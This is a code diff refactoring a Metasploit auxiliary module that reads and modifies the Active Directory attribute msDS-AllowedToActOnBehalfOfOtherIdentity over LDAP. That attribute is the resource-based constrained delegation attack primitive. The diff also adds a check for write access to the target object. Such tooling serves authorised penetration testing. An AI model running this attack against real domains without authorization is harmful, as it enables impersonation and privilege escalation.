@@ -5,7 +5,7 @@
 
 class MetasploitModule < Msf::Auxiliary
 
-  include Msf::Exploit::Remote::LDAP
+  include Msf::Exploit::Remote::LDAP::ActiveDirectory
   include Msf::OptionalSession::LDAP
 
   ATTRIBUTE = 'msDS-AllowedToActOnBehalfOfOtherIdentity'.freeze
@@ -65,32 +65,19 @@ class MetasploitModule < Msf::Auxiliary
     })
   end
 
-  def fail_with_ldap_error(message)
-    ldap_result = @ldap.get_operation_result.table
-    return if ldap_result[:code] == 0
-
-    print_error(message)
-    # Codes taken from https://ldap.com/ldap-result-code-reference-core-ldapv3-result-codes
-    case ldap_result[:code]
-    when 1
-      fail_with(Failure::Unknown, "An LDAP operational error occurred. The error was: #{ldap_result[:error_message].strip}")
-    when 16
-      fail_with(Failure::NotFound, 'The LDAP operation failed because the referenced attribute does not exist.')
-    when 50
-      fail_with(Failure::NoAccess, 'The LDAP operation failed due to insufficient access rights.')
-    when 51
-      fail_with(Failure::UnexpectedReply, 'The LDAP operation failed because the server is too busy to perform the request.')
-    when 52
-      fail_with(Failure::UnexpectedReply, 'The LDAP operation failed because the server is not currently available to process the request.')
-    when 53
-      fail_with(Failure::UnexpectedReply, 'The LDAP operation failed because the server is unwilling to perform the request.')
-    when 64
-      fail_with(Failure::Unknown, 'The LDAP operation failed due to a naming violation.')
-    when 65
-      fail_with(Failure::Unknown, 'The LDAP operation failed due to an object class violation.')
+  def get_delegate_to_obj
+    delegate_to = datastore['DELEGATE_TO']
+    if delegate_to.blank?
+      fail_with(Failure::BadConfig, 'The DELEGATE_TO option must be specified for this action.')
     end
 
-    fail_with(Failure::Unknown, "Unknown LDAP error occurred: result: #{ldap_result[:code]} message: #{ldap_result[:error_message].strip}")
+    obj = adds_get_object_by_samaccountname(@ldap, delegate_to)
+    if obj.nil? && !delegate_to.end_with?('$')
+      obj = adds_get_object_by_samaccountname(@ldap, "#{delegate_to}$")
+    end
+    fail_with(Failure::NotFound, "Failed to find sAMAccountName: #{delegate_to}") unless obj
+
+    obj
   end
 
   def get_delegate_from_obj
@@ -99,35 +86,41 @@ class MetasploitModule < Msf::Auxiliary
       fail_with(Failure::BadConfig, 'The DELEGATE_FROM option must be specified for this action.')
     end
 
-    obj = ldap_get("(sAMAccountName=#{delegate_from})", attributes: ['sAMAccountName', 'ObjectSID'])
+    obj = adds_get_object_by_samaccountname(@ldap, delegate_from)
     if obj.nil? && !delegate_from.end_with?('$')
-      obj = ldap_get("(sAMAccountName=#{delegate_from}$)", attributes: ['sAMAccountName', 'ObjectSID'])
+      obj = adds_get_object_by_samaccountname(@ldap, "#{delegate_from}$")
     end
     fail_with(Failure::NotFound, "Failed to find sAMAccountName: #{delegate_from}") unless obj
 
     obj
   end
 
-  def ldap_get(filter, attributes: [])
-    raw_obj = @ldap.search(base: @base_dn, filter: filter, attributes: attributes).first
-    return nil unless raw_obj
+  def check
+    ldap_connect do |ldap|
+      validate_bind_success!(ldap)
 
-    obj = {}
+      if (@base_dn = datastore['BASE_DN'])
+        print_status("User-specified base DN: #{@base_dn}")
+      else
+        print_status('Discovering base DN automatically')
 
-    obj['dn'] = raw_obj['dn'].first.to_s
-    unless raw_obj['sAMAccountName'].empty?
-      obj['sAMAccountName'] = raw_obj['sAMAccountName'].first.to_s
+        unless (@base_dn = ldap.base_dn)
+          print_warning("Couldn't discover base DN!")
+        end
+      end
+      @ldap = ldap
+
+      obj = get_delegate_to_obj
+      if obj.nil?
+        return Exploit::CheckCode::Unknown('Failed to find the specified object.')
+      end
+
+      unless adds_obj_grants_permissions?(@ldap, obj, SecurityDescriptorMatcher::Allow.all(%i[RP WP]))
+        return Exploit::CheckCode::Safe('The object can not be written to.')
+      end
+
+      Exploit::CheckCode::Vulnerable('The object can be written to.')
     end
-
-    unless raw_obj['ObjectSid'].empty?
-      obj['ObjectSid'] = Rex::Proto::MsDtyp::MsDtypSid.read(raw_obj['ObjectSid'].first)
-    end
-
-    unless raw_obj[ATTRIBUTE].empty?
-      obj[ATTRIBUTE] = Rex::Proto::MsDtyp::MsDtypSecurityDescriptor.read(raw_obj[ATTRIBUTE].first)
-    end
-
-    obj
   end
 
   def run
@@ -145,12 +138,7 @@ class MetasploitModule < Msf::Auxiliary
       end
       @ldap = ldap
 
-      delegate_to = datastore['DELEGATE_TO']
-      obj = ldap_get("(sAMAccountName=#{delegate_to})", attributes: ['sAMAccountName', 'ObjectSID', ATTRIBUTE])
-      if obj.nil? && !delegate_to.end_with?('$')
-        obj = ldap_get("(sAMAccountName=#{delegate_to}$)", attributes: ['sAMAccountName', 'ObjectSID', ATTRIBUTE])
-      end
-      fail_with(Failure::NotFound, "Failed to find sAMAccountName: #{delegate_to}") unless obj
+      obj = get_delegate_to_obj
 
       send("action_#{action.name.downcase}", obj)
     end
@@ -165,12 +153,12 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def action_read(obj)
-    security_descriptor = obj[ATTRIBUTE]
-    if security_descriptor.nil?
+    if obj[ATTRIBUTE].first.nil?
       print_status("The #{ATTRIBUTE} field is empty.")
       return
     end
 
+    security_descriptor = Rex::Proto::MsDtyp::MsDtypSecurityDescriptor.read(obj[ATTRIBUTE].first)
     if (sddl = sd_to_sddl(security_descriptor))
       vprint_status("#{ATTRIBUTE}: #{sddl}")
     end
@@ -182,9 +170,9 @@ class MetasploitModule < Msf::Auxiliary
 
     print_status('Allowed accounts:')
     security_descriptor.dacl.aces.each do |ace|
-      account_name = ldap_get("(ObjectSid=#{ace.body.sid})", attributes: ['sAMAccountName'])
+      account_name = adds_get_object_by_sid(@ldap, ace.body.sid)
       if account_name
-        print_status("  #{ace.body.sid} (#{account_name['sAMAccountName']})")
+        print_status("  #{ace.body.sid} (#{account_name[:sAMAccountName].first})")
       else
         print_status("  #{ace.body.sid}")
       end
@@ -194,14 +182,14 @@ class MetasploitModule < Msf::Auxiliary
   def action_remove(obj)
     delegate_from = get_delegate_from_obj
 
-    security_descriptor = obj[ATTRIBUTE]
+    security_descriptor = Rex::Proto::MsDtyp::MsDtypSecurityDescriptor.read(obj[ATTRIBUTE].first)
     unless security_descriptor.dacl && !security_descriptor.dacl.aces.empty?
       print_status('No DACL ACEs are present. No changes are necessary.')
       return
     end
 
     aces = security_descriptor.dacl.aces.snapshot
-    aces.delete_if { |ace| ace.body[:sid] == delegate_from['ObjectSid'] }
+    aces.delete_if { |ace| ace.body.sid == delegate_from[:objectSid].first }
     delta = security_descriptor.dacl.aces.length - aces.length
     if delta == 0
       print_status('No DACL ACEs matched. No changes are necessary.')
@@ -214,28 +202,27 @@ class MetasploitModule < Msf::Auxiliary
     security_descriptor.dacl.acl_count.clear
     security_descriptor.dacl.acl_size.clear
 
-    unless @ldap.replace_attribute(obj['dn'], ATTRIBUTE, security_descriptor.to_binary_s)
-      fail_with_ldap_error("Failed to update the #{ATTRIBUTE} attribute.")
-    end
+    @ldap.replace_attribute(obj.dn, ATTRIBUTE, security_descriptor.to_binary_s)
+    validate_query_result!(@ldap.get_operation_result.table)
+
     print_good("Successfully updated the #{ATTRIBUTE} attribute.")
   end
 
   def action_flush(obj)
-    unless obj[ATTRIBUTE]
+    unless obj[ATTRIBUTE]&.first
       print_status("The #{ATTRIBUTE} field is empty. No changes are necessary.")
       return
     end
 
-    unless @ldap.delete_attribute(obj['dn'], ATTRIBUTE)
-      fail_with_ldap_error("Failed to deleted the #{ATTRIBUTE} attribute.")
-    end
+    @ldap.delete_attribute(obj.dn, ATTRIBUTE)
+    validate_query_result!(@ldap.get_operation_result.table)
 
     print_good("Successfully deleted the #{ATTRIBUTE} attribute.")
   end
 
   def action_write(obj)
     delegate_from = get_delegate_from_obj
-    if obj[ATTRIBUTE]
+    if obj[ATTRIBUTE]&.first
       _action_write_update(obj, delegate_from)
     else
       _action_write_create(obj, delegate_from)
@@ -244,36 +231,36 @@ class MetasploitModule < Msf::Auxiliary
 
   def _action_write_create(obj, delegate_from)
     vprint_status("Creating new #{ATTRIBUTE}...")
+    delegate_from_sid = Rex::Proto::MsDtyp::MsDtypSid.read(delegate_from[:objectSid].first)
     security_descriptor = Rex::Proto::MsDtyp::MsDtypSecurityDescriptor.new
     security_descriptor.owner_sid = Rex::Proto::MsDtyp::MsDtypSid.new('S-1-5-32-544')
     security_descriptor.dacl = Rex::Proto::MsDtyp::MsDtypAcl.new
     security_descriptor.dacl.acl_revision = Rex::Proto::MsDtyp::MsDtypAcl::ACL_REVISION_DS
-    security_descriptor.dacl.aces << build_ace(delegate_from['ObjectSid'])
+    security_descriptor.dacl.aces << build_ace(delegate_from_sid)
 
     if (sddl = sd_to_sddl(security_descriptor))
       vprint_status("New #{ATTRIBUTE}: #{sddl}")
     end
 
-    unless @ldap.add_attribute(obj['dn'], ATTRIBUTE, security_descriptor.to_binary_s)
-      fail_with_ldap_error("Failed to create the #{ATTRIBUTE} attribute.")
-    end
+    @ldap.add_attribute(obj.dn, ATTRIBUTE, security_descriptor.to_binary_s)
+    validate_query_result!(@ldap.get_operation_result.table)
 
     print_good("Successfully created the #{ATTRIBUTE} attribute.")
     print_status('Added account:')
-    print_status("  #{delegate_from['ObjectSid']} (#{delegate_from['sAMAccountName']})")
+    print_status("  #{delegate_from_sid} (#{delegate_from[:sAMAccountName].first})")
   end
 
   def _action_write_update(obj, delegate_from)
     vprint_status("Updating existing #{ATTRIBUTE}...")
-    security_descriptor = obj[ATTRIBUTE]
+    security_descriptor = Rex::Proto::MsDtyp::MsDtypSecurityDescriptor.read(obj[ATTRIBUTE].first)
 
     if (sddl = sd_to_sddl(security_descriptor))
       vprint_status("Old #{ATTRIBUTE}: #{sddl}")
     end
 
     if security_descriptor.dacl
-      if security_descriptor.dacl.aces.any? { |ace| ace.body[:sid].to_s == delegate_from['ObjectSid'].to_s }
-        print_status("Delegation from #{delegate_from['sAMAccountName']} to #{obj['sAMAccountName']} is already configured.")
+      if security_descriptor.dacl.aces.any? { |ace| ace.body.sid == delegate_from[:objectSid].first }
+        print_status("Delegation from #{delegate_from[:sAMAccountName].first} to #{obj[:sAMAccountName].first} is already configured.")
       end
       # clear these fields so they'll be calculated automatically after the update
       security_descriptor.dacl.acl_count.clear
@@ -284,15 +271,15 @@ class MetasploitModule < Msf::Auxiliary
       security_descriptor.dacl.acl_revision = Rex::Proto::MsDtyp::MsDtypAcl::ACL_REVISION_DS
     end
 
-    security_descriptor.dacl.aces << build_ace(delegate_from['ObjectSid'])
+    delegate_from_sid = Rex::Proto::MsDtyp::MsDtypSid.read(delegate_from[:objectSid].first)
+    security_descriptor.dacl.aces << build_ace(delegate_from_sid)
 
     if (sddl = sd_to_sddl(security_descriptor))
       vprint_status("New #{ATTRIBUTE}: #{sddl}")
     end
 
-    unless @ldap.replace_attribute(obj['dn'], ATTRIBUTE, security_descriptor.to_binary_s)
-      fail_with_ldap_error("Failed to update the #{ATTRIBUTE} attribute.")
-    end
+    @ldap.replace_attribute(obj.dn, ATTRIBUTE, security_descriptor.to_binary_s)
+    validate_query_result!(@ldap.get_operation_result.table)
 
     print_good("Successfully updated the #{ATTRIBUTE} attribute.")
   end
